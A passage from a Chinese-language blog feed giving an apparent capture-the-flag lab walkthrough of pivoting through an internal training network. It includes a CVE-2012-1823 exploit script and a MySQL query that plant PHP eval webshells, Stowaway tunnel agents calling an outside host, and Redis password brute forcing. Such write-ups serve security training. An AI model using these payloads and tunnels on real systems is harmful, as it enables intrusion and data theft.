    
    <category term="flask" scheme="http://c1oudfl0w0.github.io/blog/tags/flask/"/>
    
    <category term="å†…å­˜é©¬" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>æŸæ¸—é€ï¼ˆ1ï¼‰</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/</id>
    <published>2024-07-25T09:06:04.000Z</published>
    <updated>2024-08-31T04:40:15.206Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¿™æ˜¯ä»€ä¹ˆï¼ŸNISAå†…éƒ¨é¶åœºï¼Œæ‰“ä¸€ä¸‹</p><span id="more"></span><hr><h1 id="å¼€å±€â€”â€”Shiro"><a href="#å¼€å±€â€”â€”Shiro" class="headerlink" title="å¼€å±€â€”â€”Shiro"></a>å¼€å±€â€”â€”Shiro</h1><p>å¼€å±€è¿›å…¥é¶æœº</p><p>å‘ç°æ˜¯ä¸€ä¸ªshiroæœåŠ¡</p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725172148296.png" alt="image-20240725172148296"></p><p>ç›´æ¥å·¥å…·çˆ†ç ´ä¸€æŠŠæ¢­</p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725172229146.png" alt="image-20240725172229146"></p><p>èšå‰‘è¿æ¥jspé©¬</p><p>flagåœ¨&#x2F;flag.txtï¼š<code>WSS-Studio&#123;Shiro-ad45528d-3341-41bc-8e68-7eb5b33e961c&#125;</code></p><p>ä¸Šä¼ fscanå¼€æ‰«ç½‘æ®µ</p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725170928581.png" alt="image-20240725170928581"></p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725171037365.png" alt="image-20240725171037365"></p><p>result.txt</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">192.168.100.2:9000 open192.168.100.3:8080 open192.168.100.1:8080 open192.168.100.1:443 open192.168.100.2:80 open192.168.100.1:80 open192.168.100.1:22 open192.168.100.1:21 open[*] WebTitle https://192.168.100.1     code:502 len:552    title:502 Bad Gateway[*] WebTitle http://192.168.100.1      code:404 len:548    title:404 Not Found[+] FCGI 192.168.100.2:9000 Status: 403 ForbiddenX-Powered-By: PHP/7.3.33Content-type: text/html; charset=UTF-8Access denied.stderr:Access to the script '/etc/issue' has been denied (see security.limit_extensions)plesa try other path,as -path /www/wwwroot/index.php[+] ftp 192.168.100.1:21:anonymous [*] WebTitle http://192.168.100.3:8080 code:302 len:0      title:None è·³è½¬url: http://192.168.100.3:8080/login;jsessionid=88A50ABBF8DA8065B091061A4A4A9FEB[*] WebTitle http://192.168.100.2      code:200 len:382    title:None[*] WebTitle http://192.168.100.1:8080 code:302 len:0      title:None è·³è½¬url: http://192.168.100.1:8080/login;jsessionid=AA897C0EA332974F6AE4F884E3375F6F[*] WebTitle http://192.168.100.1:8080/login;jsessionid=AA897C0EA332974F6AE4F884E3375F6F code:200 len:2608   title:Login Page[*] WebTitle http://192.168.100.3:8080/login;jsessionid=88A50ABBF8DA8065B091061A4A4A9FEB code:200 len:2608   title:Login Page[+] PocScan http://192.168.100.2 poc-yaml-php-cgi-cve-2012-1823 [+] PocScan http://192.168.100.1:8080/ poc-yaml-shiro-key [&#123;key kPH+bIxk5D2deZiIxcaaaA==&#125; &#123;mode cbc&#125;][+] PocScan http://192.168.100.3:8080/ poc-yaml-shiro-key [&#123;key kPH+bIxk5D2deZiIxcaaaA==&#125; &#123;mode cbc&#125;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆè¿™é‡Œçš„shiroå’ŒtpæœåŠ¡éƒ½å¼€äº†ä¸¤ä¸ªip</p><hr><h1 id="å†…ç½‘ä»£ç†ç¬¬ä¸€å±‚"><a href="#å†…ç½‘ä»£ç†ç¬¬ä¸€å±‚" class="headerlink" title="å†…ç½‘ä»£ç†ç¬¬ä¸€å±‚"></a>å†…ç½‘ä»£ç†ç¬¬ä¸€å±‚</h1><p>åœ¨shiroé¶æœºä¸Šä¼ stowawayçš„ linux_x64_agent è¿›è¡Œå†…ç½‘ä»£ç†ï¼Œæˆ‘è¿™é‡Œç”¨æœ¬æœºå†…ç½‘ç©¿é€ä½œä¸ºå…¬ç½‘ip</p><p>åœ¨æ§åˆ¶ç«¯ä¸Šæ‰§è¡Œï¼ˆæˆ‘ç©¿é€å‡ºå»æ˜¯30908ç«¯å£ï¼‰</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">windows_x64_admin.exe <span class="token parameter variable">-l</span> <span class="token number">666</span> <span class="token parameter variable">-s</span> <span class="token number">123</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨è¦è¢«ä»£ç†çš„æœåŠ¡å™¨ä¸Šæ‰§è¡Œ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./linux_x64_agent <span class="token parameter variable">-c</span> 7c61c35132.vicp.fun:30908 <span class="token parameter variable">-s</span> <span class="token number">123</span> <span class="token parameter variable">--reconnect</span> <span class="token number">8</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725171738901.png" alt="image-20240725171738901"></p><p>åœ¨æœ¬æœºçš„6666ç«¯å£åšsocksä»£ç†</p><p>æµè§ˆå™¨è®¾ç½®å¯¹åº”çš„ipå’Œç«¯å£è¿›è¡Œä»£ç†</p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725171822820.png" alt="image-20240725171822820"></p><p>æ¥ä¸‹æ¥ç›´æ¥è®¿é—®å†…ç½‘ipå³å¯</p><hr><h1 id="thinkphp-or-fastcgi"><a href="#thinkphp-or-fastcgi" class="headerlink" title="thinkphp or fastcgi"></a>thinkphp or fastcgi</h1><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">[+] PocScan http://192.168.100.2 poc-yaml-php-cgi-cve-2012-1823 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å‚è€ƒphp-cgi-cve-2012-1823ï¼š<a href="https://github.com/0xl0k1/CVE-2012-1823">https://github.com/0xl0k1/CVE-2012-1823</a></p><p>ä¸Šä¼ php_cgi.shåˆ°shiroé¶æœºï¼Œç›´æ¥è·‘è„šæœ¬</p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725174534196.png" alt="image-20240725174534196"></p><p>æ¥ä¸‹æ¥ä¿®æ”¹ä¸€ä¸‹shè„šæœ¬ï¼Œä¸Šé©¬</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">function</span> <span class="token function-name function">ctrl_c</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>[!] Exiting..."</span>  <span class="token builtin class-name">exit</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token builtin class-name">trap</span> ctrl_c SIGINT<span class="token comment">#if [ $# -ne 2 ]; then</span><span class="token comment">#    echo -e "\n[!] Usage: $0 &lt;RHOST> \"&lt;COMMAND>\""</span><span class="token comment">#    echo -e "\nExample: $0 http://10.128.20.2 \"whoami\"\n"</span><span class="token comment">#    exit 1</span><span class="token comment">#fi</span><span class="token assign-left variable">rhost</span><span class="token operator">=</span><span class="token variable">$1</span><span class="token assign-left variable">command</span><span class="token operator">=</span><span class="token variable">$2</span><span class="token function-name function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">#payload="&lt;?php system('$command'); die(); ?>"</span>    <span class="token assign-left variable">payload</span><span class="token operator">=</span><span class="token string">"&lt;?php file_put_contents('hack.php','&lt;?php eval(\<span class="token variable">$_POST</span>[1]);'); die(); ?>"</span>    <span class="token builtin class-name">echo</span>    <span class="token function">curl</span> <span class="token parameter variable">-s</span> <span class="token parameter variable">-X</span> POST <span class="token string">"<span class="token variable">$rhost</span>/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"</span> <span class="token parameter variable">-d</span> <span class="token string">"<span class="token variable">$payload</span>"</span> --connect-timeout <span class="token number">10</span>        <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$?</span> <span class="token parameter variable">-ne</span> <span class="token number">0</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token builtin class-name">echo</span> <span class="token string">"[!] Exploit failed!"</span>    <span class="token keyword">fi</span><span class="token punctuation">&#125;</span>exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»™èšå‰‘æŒ‚socksä»£ç†ï¼Œç„¶åè¿æ¥</p><p>ä¼ fscan</p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725180319718.png" alt="image-20240725180319718"></p><p>å¼€æ‰«</p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725180502883.png" alt="image-20240725180502883"></p><p>å‘ç°æ–°çš„å†…ç½‘ipæ®µ10.85.101.4</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">10.85.101.4:80 open10.85.101.3:80 open10.85.101.1:80 open10.85.101.1:22 open10.85.101.4:9000 open10.85.101.3:9000 open10.85.101.2:6379 open10.85.101.1:21 open10.85.101.1:443 open[+] ftp 10.85.101.1:21:anonymous [*] WebTitle https://10.85.101.1       code:502 len:552    title:502 Bad Gateway[+] FCGI 10.85.101.3:9000 Status: 403 ForbiddenX-Powered-By: PHP/7.3.33Content-type: text/html; charset=UTF-8Access denied.stderr:Access to the script '/etc/issue' has been denied (see security.limit_extensions)plesa try other path,as -path /www/wwwroot/index.php[*] WebTitle http://10.85.101.1        code:404 len:548    title:404 Not Found[+] FCGI 10.85.101.4:9000 Status: 403 ForbiddenX-Powered-By: PHP/8.2.8Content-type: text/html; charset=UTF-8Access denied.[*] WebTitle http://10.85.101.3        code:200 len:382    title:None[*] WebTitle http://10.85.101.4        code:200 len:19411  title:phpMyAdmin[+] InfoScan http://10.85.101.4        [phpMyAdmin] [+] PocScan http://10.85.101.3 poc-yaml-php-cgi-cve-2012-1823 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="å†…ç½‘ä»£ç†ç¬¬äºŒå±‚"><a href="#å†…ç½‘ä»£ç†ç¬¬äºŒå±‚" class="headerlink" title="å†…ç½‘ä»£ç†ç¬¬äºŒå±‚"></a>å†…ç½‘ä»£ç†ç¬¬äºŒå±‚</h1><p>åœ¨tpé¶æœºä¸Šé¢ä¼ å…¥stowawayå¼€å§‹ç¬¬äºŒå±‚ä»£ç†</p><p>åœ¨æˆ‘ä»¬ä¸»æœºæ§åˆ¶ç«¯ä¸Šé¢ä¾æ¬¡è¾“å…¥</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use <span class="token number">0</span>listen<span class="token number">1</span><span class="token number">1234</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725181725911.png" alt="image-20240725181725911"></p><p>è¿™æ ·å­å°±åœ¨shiroé¶æœºä¸Šå»ºç«‹äº†ä¸€ä¸ªç›‘å¬1234ç«¯å£çš„è¿æ¥</p><p>ç„¶ååœ¨tpé¶æœºä¸Šè¿æ¥ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./linux_x64_agent <span class="token parameter variable">-c</span> <span class="token number">192.168</span>.100.3:1234 <span class="token parameter variable">-s</span> <span class="token number">123</span> <span class="token parameter variable">--reconnect</span> <span class="token number">8</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725181934329.png" alt="image-20240725181934329"></p><p>æ­¤æ—¶èŠ‚ç‚¹+1</p><p>ç„¶åå†å»ºç«‹socksä»£ç†</p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725182134496.png" alt="image-20240725182134496"></p><p>åœ¨6667ç«¯å£</p><hr><h1 id="phpMyAdmin"><a href="#phpMyAdmin" class="headerlink" title="phpMyAdmin"></a>phpMyAdmin</h1><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">[*] WebTitle http://10.85.101.4        code:200 len:19411  title:phpMyAdmin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>äºæ˜¯è®¿é—®phpMyAdminï¼Œå¼±å¯†ç </p><p>æœåŠ¡ä¸è´¦å¯†ï¼š<code>localhost:root:root</code></p><p>åœ¨flagæ•°æ®åº“ä¸­æ‰¾åˆ°flagï¼š<code>WSS-Studio&#123;Mysql-08a451ad-3869-4eeb-81b3-22fa354b8aa9&#125;</code></p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725183552068.png" alt="image-20240725183552068"></p><p>æ¥ä¸‹æ¥å°è¯•getshell</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> <span class="token keyword">global</span> variables <span class="token operator">like</span> <span class="token string">'%secure%'</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725183841583.png" alt="image-20240725183841583"></p><blockquote><p>å½“<code>secure_file_priv</code>çš„å€¼ä¸º<code>null</code> ï¼Œè¡¨ç¤ºé™åˆ¶MySQL ä¸å…è®¸å¯¼å…¥|å¯¼å‡º<br>å½“<code>secure_file_priv</code>çš„å€¼ä¸º<code>/tmp/</code> ï¼Œè¡¨ç¤ºé™åˆ¶MySQL çš„å¯¼å…¥|å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨&#x2F;tmp&#x2F;ç›®å½•ä¸‹<br>å½“<code>secure_file_priv</code>çš„å€¼æ²¡æœ‰å…·ä½“å€¼æ—¶ï¼Œè¡¨ç¤ºä¸å¯¹ MySQL çš„å¯¼å…¥|å¯¼å‡ºåšé™åˆ¶</p></blockquote><p>å¯ä»¥ç›´æ¥å†™é©¬</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token string">'&lt;?php eval($_POST[1]); ?>'</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/var/www/html/hack.php'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725184023330.png" alt="image-20240725184023330"></p><p>å¾—åˆ°flagï¼š<code>WSS-Studio&#123;phpMyAdmin-ab21820c-a53d-4d7a-93aa-86d70a4a776b&#125;</code></p><p>èšå‰‘è¿ä¸Šï¼Œifconfig å‘ç°æ–°çš„å†…ç½‘ipæ®µ172.56.102.3ï¼Œä¼ fscanæ‰«å†…ç½‘</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">172.56.102.3:80 open172.56.102.1:80 open172.56.102.1:22 open172.56.102.3:9000 open172.56.102.4:8080 open172.56.102.2:5432 open172.56.102.1:21 open172.56.102.1:443 open172.56.102.4:8009 open[+] FCGI 172.56.102.3:9000 Status: 403 ForbiddenX-Powered-By: PHP/8.2.8Content-type: text/html; charset=UTF-8Access denied.[+] ftp 172.56.102.1:21:anonymous [*] WebTitle http://172.56.102.4:8080  code:200 len:90     title:$Title$[*] WebTitle http://172.56.102.1       code:404 len:548    title:404 Not Found[*] WebTitle https://172.56.102.1      code:502 len:552    title:502 Bad Gateway[*] WebTitle http://172.56.102.3       code:200 len:19411  title:phpMyAdmin[+] Postgres:172.56.102.2:5432:postgres password[+] InfoScan http://172.56.102.3       [phpMyAdmin] [+] PocScan http://172.56.102.4:8080 poc-yaml-struts2_045 poc1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h1><p>åé¢æ‰“å®Œäº†æ‰å‘ç°æ¼äº†è¿™ä¸ªç«¯å£ï¼ˆ</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">10.85.101.2:6379 open<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>stowawayè½¬å‘å‡ºæ¥</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>node <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">>></span> forward <span class="token number">9000</span> <span class="token number">10.85</span>.101.2:6379<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç”¨è¿™ä¸ªå¯¹redisçš„å¯†ç è¿›è¡Œçˆ†ç ´ï¼š<a href="https://github.com/vgo0/redisbrute">https://github.com/vgo0/redisbrute</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">â”Œâ”€â”€<span class="token punctuation">(</span>kaliã‰¿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>â””â”€$ ./redisbrute <span class="token parameter variable">--ip</span> <span class="token number">192.168</span>.4.210 <span class="token parameter variable">--port</span> <span class="token number">9000</span> <span class="token parameter variable">--passwords</span> /usr/share/wordlists/rockyou.txt<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Valid password found - <span class="token number">12345</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å¾—åˆ°å¯†ç 12345</p><p>ç™»å½•redisï¼Œæ‹¿åˆ°flag</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">redis-cli <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.4.210 <span class="token parameter variable">-p</span> <span class="token number">9000</span> <span class="token parameter variable">-a</span> <span class="token string">"12345"</span><span class="token operator">></span> KEYS *<span class="token operator">></span> GET flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h1 id="å†…ç½‘ä»£ç†ç¬¬ä¸‰å±‚"><a href="#å†…ç½‘ä»£ç†ç¬¬ä¸‰å±‚" class="headerlink" title="å†…ç½‘ä»£ç†ç¬¬ä¸‰å±‚"></a>å†…ç½‘ä»£ç†ç¬¬ä¸‰å±‚</h1><p>åŒæ ·çš„æ“ä½œï¼Œåœ¨phpMyAdminé¶æœºä¸Šé¢ä¼ stowaway linux_x64_agent</p><p>ä¸»æœºæ§åˆ¶ç«¯è¾“å…¥</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use <span class="token number">1</span>listen<span class="token number">1</span><span class="token number">1234</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å³åœ¨tpé¶æœºä¸Šå¼€ç›‘å¬1234ç«¯å£</p><p>phpMyAdminé¶æœºä¸Šè¿æ¥</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./linux_x64_agent <span class="token parameter variable">-c</span> <span class="token number">10.85</span>.101.3:1234 <span class="token parameter variable">-s</span> <span class="token number">123</span> <span class="token parameter variable">--reconnect</span> <span class="token number">8</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>äºæ˜¯èŠ‚ç‚¹+1</p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725195249782.png" alt="image-20240725195249782"></p><hr><h1 id="struts2"><a href="#struts2" class="headerlink" title="struts2"></a>struts2</h1><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">[*] WebTitle http://172.56.102.4:8080  code:200 len:90     title:$Title$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ˜¯struts2çš„æœåŠ¡</p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725200208511.png" alt="image-20240725200208511"></p><p>å·¥å…·ä¸€æŠŠæ¢­ï¼š<a href="https://github.com/abc123info/Struts2VulsScanTools">https://github.com/abc123info/Struts2VulsScanTools</a></p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725200243894.png" alt="image-20240725200243894"></p><p>flagåœ¨&#x2F;flag.txtï¼š<code>WSS-Studio&#123;Struts2-b086a0a3-2b93-4b8a-981b-ca00d360e773&#125;</code></p><hr><h1 id="PostgresSQL"><a href="#PostgresSQL" class="headerlink" title="PostgresSQL"></a>PostgresSQL</h1><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">[+] Postgres:172.56.102.2:5432:postgres password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è´¦å¯†<code>postgres:password</code></p><p>ä¿®æ”¹kaliä¸­proxychainså·¥å…·çš„&#x2F;etc&#x2F;proxychains4.confï¼Œæ”¹æˆæˆ‘ä»¬çš„socksä»£ç†åœ°å€</p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725211219637.png" alt="image-20240725211219637"></p><p>ç„¶ååœ¨<code>proxychains</code>ä¸‹ä½¿ç”¨<code>pgcli</code>è¿œç¨‹è¿æ¥ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æŸ¥è¯¢</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">â”Œâ”€â”€<span class="token punctuation">(</span>kaliã‰¿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/æ¡Œé¢<span class="token punctuation">]</span>â””â”€$ proxychains pgcli <span class="token parameter variable">-h</span> <span class="token number">172.56</span>.102.2 <span class="token parameter variable">-u</span> postgres<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> config <span class="token function">file</span> found: /etc/proxychains4.conf<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> DLL init: proxychains-ng <span class="token number">4.16</span><span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.4.210:6668  <span class="token punctuation">..</span>.  <span class="token number">172.56</span>.102.2:5432  <span class="token punctuation">..</span>.  OKPassword <span class="token keyword">for</span> postgres: <span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.4.210:6668  <span class="token punctuation">..</span>.  <span class="token number">172.56</span>.102.2:5432  <span class="token punctuation">..</span>.  OK<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.4.210:6668  <span class="token punctuation">..</span>.  <span class="token number">172.56</span>.102.2:5432 Server: PostgreSQL <span class="token number">16.3</span>Version: <span class="token number">3.4</span>.1Home: http://pgcli.compostgres@172:postgres<span class="token operator">></span>  <span class="token punctuation">..</span>.  OKpostgres@172:postgres<span class="token operator">></span> <span class="token punctuation">\</span>l+-----------+----------+----------+------------+------------+-----------------------+<span class="token operator">|</span> Name      <span class="token operator">|</span> Owner    <span class="token operator">|</span> Encoding <span class="token operator">|</span> Collate    <span class="token operator">|</span> Ctype      <span class="token operator">|</span> Access privileges     <span class="token operator">|</span><span class="token operator">|</span>-----------+----------+----------+------------+------------+-----------------------<span class="token operator">|</span><span class="token operator">|</span> flag      <span class="token operator">|</span> postgres <span class="token operator">|</span> UTF8     <span class="token operator">|</span> en_US.utf8 <span class="token operator">|</span> en_US.utf8 <span class="token operator">|</span> <span class="token operator">&lt;</span>null<span class="token operator">></span>                <span class="token operator">|</span><span class="token operator">|</span> postgres  <span class="token operator">|</span> postgres <span class="token operator">|</span> UTF8     <span class="token operator">|</span> en_US.utf8 <span class="token operator">|</span> en_US.utf8 <span class="token operator">|</span> <span class="token operator">&lt;</span>null<span class="token operator">></span>                <span class="token operator">|</span><span class="token operator">|</span> template0 <span class="token operator">|</span> postgres <span class="token operator">|</span> UTF8     <span class="token operator">|</span> en_US.utf8 <span class="token operator">|</span> en_US.utf8 <span class="token operator">|</span> <span class="token operator">=</span>c/postgres           <span class="token operator">|</span><span class="token operator">|</span>           <span class="token operator">|</span>          <span class="token operator">|</span>          <span class="token operator">|</span>            <span class="token operator">|</span>            <span class="token operator">|</span> <span class="token assign-left variable">postgres</span><span class="token operator">=</span>CTc/postgres <span class="token operator">|</span><span class="token operator">|</span> template1 <span class="token operator">|</span> postgres <span class="token operator">|</span> UTF8     <span class="token operator">|</span> en_US.utf8 <span class="token operator">|</span> en_US.utf8 <span class="token operator">|</span> <span class="token operator">=</span>c/postgres           <span class="token operator">|</span><span class="token operator">|</span>           <span class="token operator">|</span>          <span class="token operator">|</span>          <span class="token operator">|</span>            <span class="token operator">|</span>            <span class="token operator">|</span> <span class="token assign-left variable">postgres</span><span class="token operator">=</span>CTc/postgres <span class="token operator">|</span>+-----------+----------+----------+------------+------------+-----------------------+SELECT <span class="token number">4</span>Time: <span class="token number">0</span>.052spostgres@172:postgres<span class="token operator">></span> <span class="token punctuation">\</span>c flag<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.4.210:6668  <span class="token punctuation">..</span>.  <span class="token number">172.56</span>.102.2:5432  <span class="token punctuation">..</span>.  OKYou are now connected to database <span class="token string">"flag"</span> as user <span class="token string">"postgres"</span>Time: <span class="token number">0</span>.590spostgres@172:flag<span class="token operator">></span> <span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.4.210:6668  <span class="token punctuation">..</span>.  <span class="token number">172.56</span>.102.2:5432  <span class="token punctuation">..</span>.  OKpostgres@172:flag<span class="token operator">></span> <span class="token punctuation">\</span>dt+--------+------+-------+----------+<span class="token operator">|</span> Schema <span class="token operator">|</span> Name <span class="token operator">|</span> Type  <span class="token operator">|</span> Owner    <span class="token operator">|</span><span class="token operator">|</span>--------+------+-------+----------<span class="token operator">|</span><span class="token operator">|</span> public <span class="token operator">|</span> flag <span class="token operator">|</span> table <span class="token operator">|</span> postgres <span class="token operator">|</span>+--------+------+-------+----------+SELECT <span class="token number">1</span>Time: <span class="token number">1</span>.853s <span class="token punctuation">(</span><span class="token number">1</span> second<span class="token punctuation">)</span>, executed in: <span class="token number">1</span>.851s <span class="token punctuation">(</span><span class="token number">1</span> second<span class="token punctuation">)</span>postgres@172:flag<span class="token operator">></span> SELECT * FROM flag+-------------------------------------------------------------+<span class="token operator">|</span> data                                                        <span class="token operator">|</span><span class="token operator">|</span>-------------------------------------------------------------<span class="token operator">|</span><span class="token operator">|</span> WSS-Studio<span class="token punctuation">&#123;</span>Postgresql-cb6cba4a-6d7b-43b6-bfc4-0146b0d0e5af<span class="token punctuation">&#125;</span> <span class="token operator">|</span>+-------------------------------------------------------------+SELECT <span class="token number">1</span>Time: <span class="token number">0</span>.050s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ³•äºŒï¼šstowawayç›´æ¥è½¬å‘è¿™ä¸ªæ•°æ®åº“çš„ç«¯å£</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>node 